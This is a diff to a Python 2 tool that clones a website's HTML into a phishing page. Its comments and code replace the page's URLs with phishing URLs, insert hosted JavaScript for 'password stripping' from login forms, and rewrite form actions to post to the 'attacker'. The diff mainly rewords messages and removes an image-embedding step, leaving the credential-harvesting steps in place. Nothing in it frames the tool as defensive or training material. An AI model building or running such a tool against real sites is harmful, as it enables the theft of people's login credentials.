@@ -7,7 +7,7 @@ import urllib #For opening image URLs
 #This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
 def replaceURL(URL,OUTPUT):
 	#Provide user feedback
-	print "[+] Replacing URLs..."
+	print "[+] Replacing the URLs in the HTML source."
 	print "[+] URLs that will be replaced:"
 	#Open source, read lines, and begin parsing to replace all URLs for scripts and links
 	try:
@@ -28,41 +28,11 @@ def replaceURL(URL,OUTPUT):
 			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
 			output.close()
-			print "[+] URL parsing successful. URLs replaced."
+			print "[+] URL parsing successful. All URLs have been replaced."
 	except:
 		print "[-] URL parsing failed. Make sure the html file exists and is readable."
 
-#This is Step 2 - Images are found, downloaded, encoded in Base64, and embedded in the output file
-def fixImageURL(URL,OUTPUT):
-	#Provide user feedback
-	print "[+] Finding IMG tags with src=/... for replacement."
-	print "[+] RegEx matches:"
-	#Open source, read lines, and begin parsing to replace all incomplete img src URLs
-	try:
-		#Print img src URLs that will be modified and provide info
-		print "\n".join(re.findall('src="(.*?)"', open(OUTPUT).read()))
-		print "[+] Fixing src with " + URL + "..."
-		with open(OUTPUT, "r") as html:
-			#Read in the source html and parse with BeautifulSoup
-			soup = BeautifulSoup(html)
-			#Find all <img> with src attribute and create a full URL to download and embed image(s)
-			for img in soup.findAll('img'):
-				imgurl = urlparse.urljoin(URL, img['src'])
-				image = urllib.urlopen(imgurl)
-				#Encode in Base64 and embed
-				img_64 = base64.b64encode(image.read())
-				img['src'] = "data:image/png;base64," + img_64
-			source = str(soup.prettify(encoding='utf-8'))
-			#Write the updated addresses to output file while removing the [' and ']
-			output = open(OUTPUT, "w")
-			output.write(source.replace('[','').replace(']',''))
-			output.close()
-			print "[+] IMG parsing successful. IMG src's fixed."
-	except:
-		#Exception may occur if file doesn't exist or can't be read/written to
-		print "[-] IMG parsing failed. Make sure the html file exists and is readable."
-
-#This is Step 3 - Insert JavaScript for login form password dtripping and evaluation.
+#This is Step 2 - Insert JavaScript for login form password dtripping and evaluation.
 #This is done after replaceURL() or else the JavScript URL will be edited
 def insertPwdEval(OUTPUT):
 	strJSLogin = '<script type="text/javascript" src="JAVASCRIPT_LINK"></script>' #Replace src with real URL for hosted checkForm.js
@@ -83,7 +53,7 @@ def insertPwdEval(OUTPUT):
 		#Exception may occur if file doesn't exist or can't be read/written to
 		print "[-] Failed to insert JavaScript. Make sure the html file exists and is readable."
 
-#This is Step 4 - Form actions are changed to redirect POST to the 'attacker'
+#This is Step 3 - Form actions are changed to redirect POST to the 'attacker'
 def fixForms(OUTPUT):
 	#Provide user feedback
 	print "[+] Finding forms to edit."
